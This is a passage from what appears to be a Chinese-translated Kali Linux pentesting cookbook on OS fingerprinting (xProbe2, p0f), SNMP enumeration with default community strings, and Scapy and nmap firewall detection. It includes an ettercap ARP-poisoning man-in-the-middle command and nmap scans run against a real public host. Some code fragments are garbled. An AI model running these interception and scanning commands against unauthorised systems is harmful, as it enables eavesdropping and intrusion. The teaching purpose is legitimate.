  \ Linux 内核指示特定操作系统的概率为 100%。显然，这是不可能的。xProbe2 实际上是将此百分比基于在目标系统中确认的与该操作系统相关的可能特征数量。遗憾的是，从此输出可以看出，特征的细粒度不足以区分微版本。尽管如此，该工具可以作为识别目标操作系统的非常有用的辅助资源。\n\
  \n240\n# 第 4 章：工作原理……\n定义 xProbe2 如何识别远程操作系统的底层原理与 Nmap 使用的原理相同。xProbe2 操作系统识别通过发送一系列全面的探测请求，然后分析对这些请求的响应，尝试根据特定操作系统的特征和预期行为来识别底层操作系统。\n\
  \n## 使用 p0f 进行被动操作系统识别\n`p0f` 是一个为了识别远程操作系统而开发的全面工具。该工具与这里讨论的其他工具不同，因为它被设计用于被动地执行操作系统识别，而不直接与目标系统交互。本特定配方将演示如何使用\
  \ `p0f` 执行被动操作系统识别。\n\n### 准备工作\n要使用 `p0f` 进行操作系统识别，你需要一个运行网络服务的远程系统。在提供的示例中，使用了\
  \ `Metasploitable2` 实例来执行此任务。有关设置 `Metasploitable2` 的更多信息，请参考*第 1 章**入门*中的*安装 Metasploitable2*配方。\n\
  \n### 如何操作……\n如果你直接从命令行执行 `p0f` 而不进行任何先的环境设置，你会发现，除非你直接与网络上的某些系统交互，否则它不会提供太多信息：\n\
  \n```\nroot@KaliLinux:~# p0f\np0f - passive os fingerprinting utility, version 2.0.8\n\
  (C) M. Zalewski <lcamtuf@dione.cc>, W. Stearns <wstearns@pobox.com>\np0f: listening\
  \ (SYN) on 'eth1', 262 sigs (14 generic, cksum0F1F5CA2), rule: 'all'.\n```\n\n这种信息的缺失证明了一个事实：与我们讨论的其他工具不同，`p0f`\
  \ 不会主动探测设备以确定其操作系统。相反，它只是静静地监听。我们可以在另一个终端中运行 `Nmap` 扫描来生成流量，但这违背了被动操作系统识别器的整个初衷。相反，我们需要一种方法将流量路由通过我们的本地接口进行分析，以便对其进行被动分析。\n\
  \n241\n指纹识别\nEttercap 提供了一个极佳的解决方案，提供了中毒 ARP 缓存和创建中间人场景的能力。要让流量通过你的本地接口，你需要对这两个系统进行中毒：\n\
  \n```\nroot@KaliLinux:~# ettercap -M arp:/172.16.36.1/172.16.36.135 -T -w output.pcap\n\
  ```\n\n在提供的示例中，`ettercap` 在命令行执行。`-M` 选项定义由 `arp` 参数指定的模式。`-T` 选项指示以文本模式操作，`-w`\
  \ 选项用于指定导出捕获的文件。一旦你建立了中间人（MITM），你可以在另一个终端中再次执行 `p0f`。假设两个中毒的主机正在通信，你应该看到以下内容：\n\n\
  ```\nroot@KaliLinux:~# p0f\n...\n```\n\n\n\n\n\n所有通过 `p0f` 监听器的数据包都会被标记为 `UNKNOWN`\
  \ 或与特定的操作系统签名关联。一旦完成充分分析，您应该通过输入 `q` 来优雅地关闭 `Ettercap` 文本界面。这将对受害者进行重新 ARP，以防止发生服务中断：\n\
  \n**正在关闭文本界面...**\n\n**ARP 毒化已禁用。**\n\n**正在对受害者进行重新 ARP...**\n\n**统一嗅探已停止。**\n\n\
  243\n\n### 指纹识别\n\n### 工作原理……\nARP 毒化涉及利用免费 ARP 响应来欺骗受害者系统，使其认为目标 IP 地址与中间人攻击（MITM）系统的\
  \ MAC 地址关联。\n\nMITM 系统将接收来自两个受毒系统的流量，并将流量转发到目标接收者。这将允许 MITM 系统嗅探线缆上的所有流量。通过分析这些流量的独特行为和特征，`p0f`\
  \ 可以在不直接探测设备响应的情况下，识别网络上设备的操作系统。\n\n### 使用 Onesixtyone 进行 SNMP 分析\n\nOnesixtyone\
  \ 是一种 SNMP 分析工具，以其 SNMP 运行的 UDP 端口命名。它是一个非常简单的 SNMP 扫描器，仅请求任何指定 IP 地址的系统描述值。\n\n\
  ### 准备工作\n要使用 Onesixtyone 执行 SNMP 分析，您需要启用 SNMP 且可以被探测和检查的设备。在提供的示例中，使用了安装 Windows\
  \ XP 来执行此任务。有关设置 Windows 系统的更多信息，请参阅第 1 章中的`安装 Windows Server` 教程。`入门指南`。\n\n###\
  \ 如何操作……\n这些信息可用于准确识别目标设备的操作系统指纹。使用 Onesixtyone 时可以将目标 IP 地址和团体字符串（community string）作为参数：\n\
  \n```\nroot@KaliLinux:~# onesixtyone 172.16.36.134 public\nScanning 1 hosts, 1 communities\n\
  172.16.36.134 [public] Hardware: x86 Family 6 Model 58 Stepping 9\nAT/AT COMPATIBLE\
  \ - Software: Windows 2000 Version 5.1 (Build 2600\nUniprocessor Free)\n```\n\n\
  在提供的示例中，使用团体字符串 `public` 来查询 `172.16.36.134` 设备的系统描述。这是各种网络设备最常用的默认团体字符串之一。如输出所示，远程主机用一个标识其身份的描述字符串响应了查询。\n\
  \n244\n\n*第 4 章*\n\n### 工作原理……\nSNMP 是一种用于管理网络设备并促进这些设备之间信息共享的协议。在企业网络环境中，使用该协议通常是必要的；然而，系统管理员经常未能修改用于在\
  \ SNMP 设备间共享信息的默认团体字符串。在这种情况下，可以通过恰当猜测这些设备使用的默认团体字符串来收集有关网络设备的信息。\n\n### 使用 SNMPwalk\
  \ 进行 SNMP 分析\n\nSNMPwalk 是一种更复杂的 SNMP 扫描器，可从具有可猜测 SNMP 团体字符串的设备中收集大量信息。`SNMPwalk`\
  \ 通过循环一系列请求，从服务中收集尽可能的信息。\n\n### 准备工作\n要使用 `SNMPwalk` 执行 SNMP 分析，您需要启用 SNMP 且可以被探测和检查的设备。在提供的示例中，使用了安装\
  \ Windows XP 来执行此任务。有关设置 Windows 系统的更多信息，请参阅第 1 章中的`安装 Windows Server` 教程。`入门指南`。\n\
  \n### 如何操作……\n要执行 `SNMPwalk`，应向工具传递一系列参数，包括要分析的系统 IP 地址、使用的团体字符串以及系统采用的 SNMP 版本：\n\
  \n```\nroot@KaliLinux:~# snmpwalk 172.16.36.134 -c public -v 2c\niso.3.6.1.2.1.1.1.0\
  \ = STRING: \"Hardware: x86 Family 6 Model 58\nStepping 9 AT/AT COMPATIBLE - Software:\
  \ Windows 2000 Version 5.1\n(Build 2600 Uniprocessor Free)\"\niso.3.6.1.2.1.1.2.0\
  \ = OID: iso.3.6.1.4.1.311.1.1.3.1.1\niso.3.6.1.2.1.1.3.0 = Timeticks: (56225) 0:09:22.25\n\
  iso.3.6.1.2.1.1.4.0 = \"\"\niso.3.6.1.2.1.1.5.0 = STRING: \"DEMO-72E8F41CA4\"\n\
  iso.3.6.1.2.1.1.6.0 = \"\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 76\niso.3.6.1.2.1.2.1.0\
  \ = INTEGER: 2\n```\n\n245\n\n*指纹识别*\n\n```\niso.3.6.1.2.1.2.2.1.1.1 = INTEGER:\
  \ 1\niso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2\niso.3.6.1.2.1.2.2.1.2.1 = Hex-STRING:\
  \ 4D 53 20 54 43 50 20 4C 6F 6F\n70 62 61 63 6B 20\n69 6E 74 65 72 66 61 63 65 00\n\
  iso.3.6.1.2.1.2.2.1.2.2 = Hex-STRING: 41 4D 44 20 50 43 4E 45 54 20\n46 61 6D 69\
  \ 6C 79\n```\n\n针对启用 SNMP 的 Windows XP 系统使用 `SNMPwalk` 时，使用了默认团体字符串 `public`，版本为\
  \ `2c`。这产生了大量的输出，在此处的演示中已被截断。注意，默认情况下，所有识别出的信息前面都有查询的 OID 值。可以通过将输出管道到 `cut` 函数来清理，以移除这些标识符：\n\
  \n```\nroot@KaliLinux:~# snmpwalk 172.16.36.134 -c public -v 2c | cut -d \"=\" -f\
  \ 2\nSTRING: \"Hardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE\n- Software:\
  \ Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)\"\nOID: iso.3.6.1.4.1.311.1.1.3.1.1\n\
  Timeticks: (75376) 0:12:33.76\n\"\"\nSTRING: \"DEMO-72E8F41CA4\"\n```\n\n注意，`SNMPwalk`\
  \ 的输出提供的信息远不止系统标识符。在检查输出时，某些信息可能显而易见，而另一些信息可能看起来更晦涩。然而，通过进行彻底分析，你可以收集关于目标系统的大量信息：\n\
  \n```\nHex-STRING: 00 56 FF 2A E8\nHex-STRING: 00 0C 29 09 C3 79\nIpAddress: 172.16.36.2\n\
  IpAddress: 172.16.36.180\nIpAddress: 172.16.36.254\nSTRING: \"FreeSSHService.exe\"\
  \nSTRING: \"vmtoolsd.exe\"\nSTRING: \"java.exe\"\nSTRING: \"postgres.exe\"\nSTRING:\
  \ \"java.exe\"\nSTRING: \"TPAutoSvc.exe\"\nSTRING: \"snmp.exe\"\nSTRING: \"snptrap.exe\"\
  \nSTRING: \"TPAutoConnect.exe\"\nSTRING: \"alg.exe\"\nSTRING: \"cmd.exe\"\nSTRING:\
  \ \"postgres.exe\"\nSTRING: \"freeSSHd 1.2.0\"\nSTRING: \"CesarFTP 0.99g\"\n```:2246\n\
  ```\n\n### 使用 Scapy 进行防火墙识别\n\n通过评估选择数据包注入返回的响应，可以确定远程端口是否被防火墙设备过滤。为了深入理解这一过程的工作原理，我们可以使用\
  \ `Scapy` 在数据包级别执行此任务。\n\n\n\n\n\n要使用 `Scapy` 来执行防火墙识别，你需要一个运行着网络服务的远程系统。此外，你还需要实现某种过滤机制。\n\
  \n这可以通过独立的防火墙设备或基于主机的过滤（如 `Windows firewall`）来实现。通过操纵防火墙设备上的过滤设置，你应该能够修改针对注入数据包的响应。\n\
  \n# 指纹识别\n\n### 如何操作……\n\n为了有效判断一个 TCP 端口是否经过过滤，需要向目标端口同时发送一个 `TCP SYN` 包和一个 `TCP\
  \ ACK` 包。根据响应这些注入包包返回的数据包，我们可以确定端口是否被过滤。大多数情况下，这两个数据包的注入会导致四种不同的响应组合之一。\n\n我们将讨论这些每种场景、它们指示了与目标端口相关的什么过滤情况，以及如何对每种情况进行测试。这四种可能的响应组合包括：\n\
  \n- `SYN` 不产生响应，而 `ACK` 请求 `RST` 响应\n- `SYN` 请求 `SYN + ACK` 或 `SYN + RST` 响应，而 `ACK`\
  \ 不产生响应\n- `SYN` 请求 `SYN + ACK` 或 `SYN + RST` 响应，而 `ACK` 请求 `RST` 响应\n- `SYN` 不产生响应，且\
  \ `ACK` 不产生响应\n\n在第一种情况下，我们应该考虑一种配置：注入的 `SYN` 包不产生响应，而 `ACK` 包请求 `RST` 响应。要测试这一点，我们应该首先向目标端口发送一个\
  \ `TCP ACK` 包。要向任何给端口发送 `TCP ACK` 包，我们必须首先构建请求的层。我们需要构造的第一层是 `IP` 层：\n\n```bash\n\
  root@KaliLinux:~# scapy\nWelcome to Scapy (2.2.0)\n>>> i = IP()\n>>> i.display()\n\
  ###[ IP ]\nversion= 4\nihl= None\ntos= 0x0\nlen= None\nid= 1\nflags=\nfrag= 0\n\
  ttl= 64\nproto= ip\nchksum= None\nsrc= 127.0.0.1\ndst= 127.0.0.1\noptions=\n>>>\
  \ i.dst = \"172.16.36.135\"\n>>> i.display()\n###[ IP ]\nversion= 4\nihl= None\n\
  tos= 0x0\nlen= None\nid= 1\nflags=\nfrag= 0\nttl= 64\nproto= ip\nchksum= None\n\
  src= 172.16.36.180\ndst= 172.16.36.135\noptions=\n```\n\n为了构建请求的 `IP` 层，我们应该将 `IP`\
  \ 对象赋值给变量 `i`。通过调用 `display` 函数，我们可以识别对象的属性配置。默认情况下，发送地址和接收地址都设置为 `127.0.0.1` 回环地址。可以通过更改目标地址来修改这些值，将\
  \ `i.dst` 设置为我们想要扫描的地址的字符串值。通过再次调用 `display` 函数，我们可以看到不仅目标地址已更新，`Scapy` 还会自动更新源\
  \ IP 地址为与默认接口关联的地址。现在我们已经构建了请求的 `IP` 层，应该继续 `TCP` 层：\n\n```python\n>>> t = TCP()\n\
  >>> t.display()\n###[ TCP ]\nsport= ftp_data\ndport= http\nseq= 0\nack= 0\ndataofs=\
  \ None\nreserved= 0\nflags= S\nwindow= 8192\nchksum= None\nurgptr= 0\noptions= {}\n\
  >>> t.dport = 22\n>>> t.flags = 'A'\n>>> t.display()\n###[ TCP ]\nsport= ftp_data\n\
  dport= ssh\nseq= 0\nack= 0\ndataofs= None\nreserved= 0\nflags= A\nwindow= 8192\n\
  chksum= None\nurgptr= 0\noptions= {}\n```\n\n为了构建请求的 `TCP` 层，我们将使用对 `IP` 层所执行的相同技术。在提供的示例中，`TCP`\
  \ 对象被赋值给变量 `t`。如之前所述，可以通过调用 `display` 函数来识别默认配置。在这里，我们可以看到源端口的默认值设置为端口 21 (FTP)，目标端口的默认值设置为端口\
  \ 80 (HTTP)。通过将其设置为新的目标端口值，可以修改目标端口值，并将 `flags` 值设置为 `A` 以表示应激活 `ACK` 标志位。现在我们已经创建了\
  \ `IP` 和 `TCP` 层，我们需要通过堆叠这些层来构建请求：\n\n```python\n>>> request = (i/t)\n>>> request.display()\n\
  ###[ IP ]\nversion= 4\nihl= None\ntos= 0x0\nlen= None\nid= 1\nflags=\nfrag= 0\n\
  ttl= 64\nproto= tcp\nchksum= None\nsrc= 172.16.36.180\ndst= 172.16.36.135\noptions=\n\
  ###[ TCP ]\nsport= ftp_data\ndport= ssh\nseq= 0\nack= 0\ndataofs= None\nreserved=\
  \ 0\nflags= A\nwindow= 8192\nchksum= None\nurgptr= 0\noptions= {}\n```\n\n可以通过正斜杠分隔变量来堆叠\
  \ `IP` 和 `TCP` 层。然后可以将这些层赋值给新变量，该变量将代表整个请求。然后可以调用 `display` 函数来查看请求的配置。一旦构建了 `request`，就可以将其传递给\
  \ `sr1` 函数，以便我们可以分析响应：\n\n```python\n>>> response = sr1(request,timeout=1)\n..Begin\
  \ emission:\n.........Finished to send 1 packets.\n***\nReceived 16 packets, got\
  \ 1 answers, remaining 0 packets\n>>> response.display()\n###[ IP ]\nversion= 4L\n\
  ihl= 5L\ntos= 0x0\nlen= 40\nid= 0\nflags= DF\nfrag= 0L\nttl= 63\nproto= tcp\nchksum=\
  \ 0x9974\nsrc= 172.16.36.135\ndst= 172.16.36.180\noptions=\n###[ TCP ]\nsport= ssh\n\
  dport= ftp_data\nseq= 0\nack= 0\ndataofs= 5L\nreserved= 0\nflags= R\nwindow= 0\n\
  chksum= 0xe5\nurgptr= 0\noptions={}\n```\n\n可以在独立构建每一层的情况下执行相同的请求。相反，可以通过直接调用函数并传递适当参数来使用单行命令：\n\
  \n```python\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1)\n\
  ..Begin emission:\n.........Finished to send 1 packets.\n***\nReceived 16 packets,\
  \ got 1 answers, remaining 0 packets\n>>> response\n<IP version=4L ihl=5L tos=0x0\
  \ len=40 id=0 flags=DF frag=0L ttl=63 proto=tcp cksum=0x9974 src=172.16.36.135 dst=172.16.36.180\
  \ options=[]><TCP sport=ssh dport=ftp_data seq=0 ack=0 dataofs=5L reserved=0 flags=R\
  \ window=0 cksum=0xe5 urgptr=0 options={}>\n```\n\n注意在这种特定情况下，对注入的 `ACK` 包收到了一个\
  \ `RST` 包。测试的下一步是以相同方式注入一个 `SYN` 包：\n\n```python\n>>> response = sr1(IP(dst=\"172.16.36.135\"\
  )/TCP(dport=22,flags='S'),timeout=1,verbose)\n=0)\nBegin emission:\nFinished to\
  \ send 1 packets.\n***\nReceived 9 packets, got 0 answers, remaining 1 packets\n\
  ```\n\n当以相同方式发送 `SYN` 请求时，没有收到响应，函数在超过超时值时停止。这种响应组合表明状态过滤正在生效。套字通过丢弃 `SYN` 请求拒绝所有入站连接，但未过滤\
  \ `ACK` 包，以确保出站连接和持续通信的可能性。这种响应组合可以在 Python 中进行测试以识别状态过滤的端口：\n\n```bash\nroot@KaliLinux:~#\
  \ python\nPython 2.7.3 (default, Jan 2 2013, 16:53:07)\n[GCC 4.7.2] on linux2\n\
  Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\
  >>> from scapy.all import *\n>>> ACK_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose)\n\
  =0)\n>>> SYN_response =\n```\n\n\n\n\n\n```\nsr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=0)\n\
  >>> if ((ACK_response == None) or (SYN_response == None)) and not ((ACK_response\
  \ ==None) and (SYN_response == None)):\n... print \"Stateful filtering in place\"\
  \n...\nStateful filtering in place\n>>> exit()\n```\n\n在用 `scapy` 构造出每个请求后，用于评估这些响应的测试可以确定是否从\
  \ `ACK` 或 `SYN` 注入中接收到了响应，但不是两者都收到。此测试可以有效识别这种场景以及接下来的场景——在该情况下，将收到来自 `SYN` 注入的回复，但没有\
  \ `ACK` 注入的回复。如果 `SYN` 注入请求了 `SYN + ACK` 或 `RST + ACK` 响应，但 `ACK` 注入没有请求响应，这也是状态过滤的迹象。这种情况的测试方法保持相同。首先，应向目标端口发送一个\
  \ `ACK` 数据包：\n\n```\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 16 packets, got 0 answers,\
  \ remaining 1 packets\n```\n\n253\n\n### 指纹识别\n\n注意，在提供的示例中，该注入没有请求任何响应。或者，如果注入一个\
  \ `SYN` 数据包，如果端口开启，则会收到激活了 `SYN + ACK` 标志位的响应；如果端口关闭，则收到激活了 `RST + ACK` 标志位的响应：\n\
  \n```python\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 5 packets, got 1 answers,\
  \ remaining 0 packets\n>>> response.display()\n```\n\n```\n###[ IP ]###\nversion=\
  \ 4L\nihl= 5L\ntos= 0x0\nlen= 44\nid= 0\nflags= DF\nfrag= 0L\nttl= 63\nproto= tcp\n\
  chksum= 0x9970\nsrc= 172.16.36.135\ndst= 172.16.36.180\n\\options\\\n###[ TCP ]###\n\
  sport= ssh\ndport= ftp_data\nseq= 3860234270L\nack= 1\ndataofs= 6L\nreserved= 0L\n\
  flags= SA\nwindow= 5840\nchksum= 0x798a\nurgptr= 0\noptions= [('MSS', 1460)]\n###[\
  \ Padding ]###\nload= '\\x00\\x00'\n```\n\n254\n\n### 第 4 章\n\n在这种情况下也可以执行完全相同的测试，因为该测试通过判断两个注入中是否有一个请求了响应（而非两者都请求）来确定是否存在状态过滤：\n\
  \n```bash\nroot@KaliLinux:~# python\nPython 2.7.3 (default, Jan 2 2013, 16:53:07)\n\
  [GCC 4.7.2] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\"\
  \ for more information.\n>>> from scapy.all import *\n>>> ACK_response = sr1(IP(dst=\"\
  172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=0)\n>>> SYN_response\
  \ = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=0)\n\
  >>> if ((ACK_response == None) or (SYN_response == None)) and not ((ACK_response\
  \ ==None) and (SYN_response == None)):\n... print \"Stateful filtering in place\"\
  \n...\nStateful filtering in place\n>>> exit()\n```\n\n这种响应组合表明对 `ACK` 数据包正在执行状态过滤，任何在适当会话上下文之外发送的\
  \ `ACK` 数据包会被丢弃。然而，从入站连接尝试的响应来看，端口并没有被完全过滤。另一种可能的情况是 `SYN` 和 `ACK` 注入都请求了它们预期的响应。在这种情况下，没有任何过滤的迹象。要对这种场景进行测试，应执行\
  \ `ACK` 注入并分析响应：\n\n```python\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 5 packets, got 1 answers,\
  \ remaining 0 packets\n>>> response.display()\n```\n\n```\n###[ IP ]###\nversion=\
  \ 4L\nihl= 5L\ntos= 0x0\nlen= 40\nid= 0\nflags= DF\nfrag= 0L\nttl= 64\nproto= tcp\n\
  chksum= 0x9974\nsrc= 172.16.36.135\ndst= 172.16.36.180\n\\options\\\n###[ TCP ]###\n\
  sport= ssh\ndport= ftp_data\nseq= 0\nack= 0\ndataofs= 5L\nreserved= 0L\nflags= R\n\
  window= 0\nchksum= 0xe5b\nurgptr= 0\noptions= {}\n###[ Padding ]###\nload= '\\x00\\\
  x00\\x00\\x00\\x00\\x00'\n```\n\n255\n\n### 指纹识别\n\n在端口未被过滤的情况下，向目标端口发送的未请求的 `ACK`\
  \ 数据包应导致返回一个 `RST` 数据包。该 `RST` 数据包表明 `ACK` 数据包是在脱离上下文发送的，旨在终止通信。在发送 `ACK` 注入后，也应向同一端口发送\
  \ `SYN` 注入：\n\n```python\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 4 packets, got 1 answers,\
  \ remaining 0 packets\n>>> response.display()\n\n```\n###[ IP ]###\nversion= 4L\n\
  ihl= 5L\ntos= 0x0\nlen= 44\nid= 0\nflags= DF\nfrag= 0L\nttl= 63\nproto= tcp\nchksum=\
  \ 0x9970\nsrc= 172.16.36.135\ndst= 172.16.36.180\n\\options\\\n###[ TCP ]###\nsport=\
  \ ssh\ndport= ftp_data\nseq= 3860234270L\nack= 1\ndataofs= 6L\nreserved= 0L\nflags=\
  \ SA\nwindow= 5840\nchksum= 0x79a\nurgptr= 0\noptions= [('MSS', 1460)]\n```\n\n\
  256\n\n### 第 4 章\n\n在端口未被过滤且开启的情况下，`TCP` 标志的实际值为 18。注意 `TCP` 标志的实际值是一个长整数（long），这个值可以很容易地转换。假设没有状态过滤的迹象，我们可以通过在\
  \ Python 中评估 `TCP` 标志值的整数转换来测试端口是否未被过滤：\n\n```bash\nroot@KaliLinux:~# python\nPython\
  \ 2.7.3 (default, Jan 2 2013, 16:53:07)\n[GCC 4.7.2] on linux2\nType \"help\", \"\
  copyright\", \"credits\" or \"license\" for more information.\n>>> from scapy.all\
  \ import *\n>>> ACK_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=0)\n\
  >>> SYN_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=0)\n\
  >>> if ((ACK_response == None) or (SYN_response == None)) and not ((ACK_response\
  \ ==None) and (SYN_response == None)):\n... print \"Stateful filtering in place\"\
  \n... elif int(SYN_response[TCP].flags) == 18:\n... print \"Port is unfiltered and\
  \ open\"\n... elif int(SYN_response[TCP].flags) == 20:\n... print \"Port is unfiltered\
  \ and closed\"\n...\n```\n\n类似的测试可以用来判断端口是否未被过滤且关闭。未过滤的关闭端口将激活 `RST` 和 `ACK` 标志位。如前所述，`ACK`\
  \ 标志位的十进制值为 16，而 `RST` 标志位的十进制值为 4。因此，未过滤关闭端口的 `TCP` 标志预期整数转换应为 20：\n\n```bash\n\
  root@KaliLinux:~# python\nPython 2.7.3 (default, Jan 2 2013, 16:53:07)\n[GCC 4.7.2]\
  \ on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\
  >>> from scapy.all import *\n>>> ACK_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=0)\n\
  >>> SYN_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=0)\n\
  ```\n\n\n\n\n\n```python\n>>> if ((ACK_response == None) or (SYN_response == None))\
  \ and not ((ACK_response ==None) and (SYN_response == None)):\n    ... print \"\
  Stateful filtering in place\"\n    ... elif int(SYN_response[TCP].flags) == 18:\n\
  \    ... print \"Port is unfiltered and open\"\n    ... elif int(SYN_response[TCP].flags)\
  \ == 20:\n    ... print \"Port is unfiltered and closed\"\n>>> exit()\n``` \n\n\
  最后，我们应该考虑未收到 `SYN` 或 `ACK` 注入响应的情况。在这种情况下，当超过超时值时，`sr1` 函数的两个实例将停止：\n\n```python\n\
  >>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='A'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 36 packets, got 0 answers,\
  \ remaining 1 packets\n>>> response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=22,flags='S'),timeout=1,verbose=1)\n\
  Begin emission:\nFinished to send 1 packets.\nReceived 18 packets, got 0 answers,\
  \ remaining 1 packets\n```\n\n这两种注入都缺乏响应可能表明该端口被无状态过滤（unstatefully filtered），并且无论状态如何都会丢弃所有入站流量，也可能表明远程主机已宕机。人们首先的想法可能是，可以通过\
  \ Python 中在之前开发的测试序列末尾添加一个 `else` 执行流来测试这一点。在理论上，如果其中一个或两个注入都未收到响应，则会执行该 `else`\
  \ 操作。简而言之，如果没有收到任何响应，则会执行 `else` 操作：\n\n```bash\nroot@KaliLinux:~# python\nPython\
  \ 2.7.3 (default, Jan 2 2013, 16:53:07)\n[GCC 4.7.2] on linux2\nType \"help\", \"\
  copyright\", \"credits\" or \"license\" for more information.\n>>> from scapy.all\
  \ import *\n>>> ACK_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=4444,flags='A'),timeout=1,verbose=0)\n\
  >>> SYN_response = sr1(IP(dst=\"172.16.36.135\")/TCP(dport=4444,flags='S'),timeout=1,verbose=0)\n\
  >>> if ((ACK_response == None) or (SYN_response == None)) and not ((ACK_response\
  \ ==None) and (SYN_response == None)):\n    ... print \"Stateful filtering in place\"\
  \n    ... elif int(SYN_response[TCP].flags) == 18:\n    ... print \"Port is unfiltered\
  \ and open\"\n    ... elif int(SYN_response[TCP].flags) == 20:\n    ... print \"\
  Port is unfiltered and closed\"\n    ... else:\n    ... print \"Port is either unstatefully\
  \ filtered or host is down\"\n\nTraceback (most recent call last):\nFile \"<stdin>\"\
  , line 3, in <module>\nTypeError: 'NoneType' object has no attribute '__getitem__'\n\
  ```\n\n虽然这在理论上似乎行得通，但在实践中效果较差。如果对一个没有值的变量进行值测试，Python 实际上会返回错误。为了避免这个问题，应该检查的第一个条件是是否至少收到了任何响应：\n\
  \n```python\n>>> if (ACK_response == None) and (SYN_response == None):\n    ...\
  \ print \"Port is either unstatefully filtered or host is down\"\n\nPort is either\
  \ unstatefully filtered or host is down\n```\n\n随后可以将这整个测试序列集成到一个单一的功能脚本中。该脚本将接受两个参数，包括目标\
  \ IP 地址和要测试的端口。随后将注入 `ACK` 包和 `SYN` 包，并将响应（如果有的话）存储起来以供评估。然后，将进行四项测试以确定端口上是否存在过滤。最初，将进行一项测试以确定是否收到了任何响应。\n\
  \n如果没有收到任何响应，输出将指示远程主机已宕机或端口被无状态过滤并丢弃所有流量。如果收到了任何响应，将进行测试以确定其是否仅对其中一个注入有响应而非另一个。如果是这种情况，输出将指示该端口被了状态过滤（statefully\
  \ filtered）。最后，如果从两个注入中都收到了响应，则该端口将被识别为未过滤，并将评估 `TCP` 标志值以确定端口是开放还是关闭：\n\n```python\n\
  #!/usr/bin/python\nimport sys\nimport logging\nlogging.getLogger(\"scapy.runtime\"\
  ).setLevel(logging.ERROR)\n\nfrom scapy.all import *\n\nif len(sys.argv) != 3:\n\
  \    print \"Usage - ./ACK_FW_detect.py [Target-IP] [Target Port]\"\n    print \"\
  Example - ./ACK_FW_detect.py 10.0.0.5 443\"\n    print \"Example will determine\
  \ if filtering exists on port 443 of host 10.0.0.5\"\n    sys.exit()\n\nip = sys.argv[1]\n\
  port = int(sys.argv[2])\nACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags='A'),timeout=1,verbose=0)\n\
  SYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags='S'),timeout=1,verbose=0)\n\n\
  if (ACK_response == None) and (SYN_response == None):\n    print \"Port is either\
  \ unstatefully filtered or host is down\"\nelif ((ACK_response == None) or (SYN_response\
  \ == None)) and not ((ACK_response ==None) and (SYN_response == None)):\n    print\
  \ \"Stateful filtering in place\"\nelif int(SYN_response[TCP].flags) == 18:\n  \
  \  print \"Port is unfiltered and open\"\nelif int(SYN_response[TCP].flags) == 20:\n\
  \    print \"Port is unfiltered and closed\"\nelse:\n    print \"Unable to determine\
  \ if filtered\"\n```\n\n\n\n\n\n262\n\n# 第 4 章\n\n## packtpub.com (83.166.169.228)\
  \ 的 Nmap 扫描报告\n\n**主机已上线（延迟 0.14s）。**\n\n**端口 状态 服务**\n\n**22/tcp filtered ssh**\n\
  \n**Nmap 完成：扫描了 1 个 IP 地址（1 个在线主机），耗时 2.23 秒**\n\n通过对本地网络中的 Metasploitable2 系统进行此扫描且不通过防火墙路由流量，响应结果表明\
  \ TCP 端口 22 (SSH) 是未过滤的。然而，如果我对 packtpub.com 关联的远程 IP 地址进行相同的扫描，端口 22 则是被过滤的。可以通过在不提供端口规范的情况下执行相同的扫描，对\
  \ Nmap 的 1,000 个常用端口进行端口过滤评估：\n\n```\nroot@KaliLinux:~# nmap -sA 172.16.36.135\n\
  Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:21 EST\nNmap scan report\
  \ for 172.16.36.135\nHost is up (0.00041s latency).\nAll 1000 scanned ports on 172.16.36.135\
  \ are unfiltered\nMAC Address: 00:0C:29:3D:84:32 (VMware)\nNmap done: 1 IP address\
  \ (1 host up) scanned in 0.10 seconds\n```\n\n当对本地网络中未位于任何防火墙背后的 Metasploitable2\
  \ 系统进行扫描时，结果显示所有扫描的端口都是未过滤的。如果对 packtpub.com 域名进行相同的扫描，除了托管 Web 应用的 TCP 80 端口外，所有端口都被识别为被过滤的。注意，当扫描端口范围时，输出仅包含未过滤的端口：\n\
  \n```\nroot@KaliLinux:~# nmap -sA 83.166.169.228\nStarting Nmap 6.25 ( http://nmap.org\
  \ ) at 2014-01-24 11:25 EST\nNmap scan report for packtpub.com (83.166.169.228)\n\
  Host is up (0.15s latency).\nNot shown: 999 filtered ports\nPORT STATE SERVICE\n\
  80/tcp unfiltered http\nNmap done: 1 IP address (1 host up) scanned in 13.02 seconds\n\
